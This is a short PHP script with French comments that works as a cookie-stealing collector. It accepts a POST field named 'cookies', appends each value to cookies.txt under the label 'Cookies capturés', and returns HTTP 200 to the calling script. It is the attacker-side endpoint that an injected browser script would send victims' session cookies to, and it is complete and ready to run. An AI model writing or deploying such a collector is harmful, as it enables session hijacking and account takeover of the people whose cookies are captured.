<?php
// Récupère les données envoyées en POST
$cookies = $_POST['cookies'] ?? 'No cookies';

// Sauvegarde les cookies dans un fichier texte pour les examiner
$file = fopen("cookies.txt", "a");
fwrite($file, "Cookies capturés : " . $cookies . "\n");
fclose($file);

// Réponse au script pour indiquer que tout s'est bien passé
http_response_code(200);
?>
